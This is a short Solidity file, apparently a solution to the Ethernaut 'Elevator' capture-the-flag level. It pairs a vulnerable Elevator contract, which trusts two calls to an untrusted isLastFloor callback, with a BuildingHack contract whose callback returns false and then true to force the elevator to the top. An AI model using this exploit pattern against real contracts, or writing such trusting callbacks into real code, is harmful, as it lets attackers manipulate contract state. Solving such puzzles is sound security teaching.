// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingHack {
    Elevator public el = Elevator("DEPLOYED_ADDRESS"); 
    bool public switchFlipped =  false; 
    
    function hack() public {
        el.goTo(1);
    }
    
    function isLastFloor(uint) payable public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
      } else {
        switchFlipped = false;
        return true;
      }
    }
}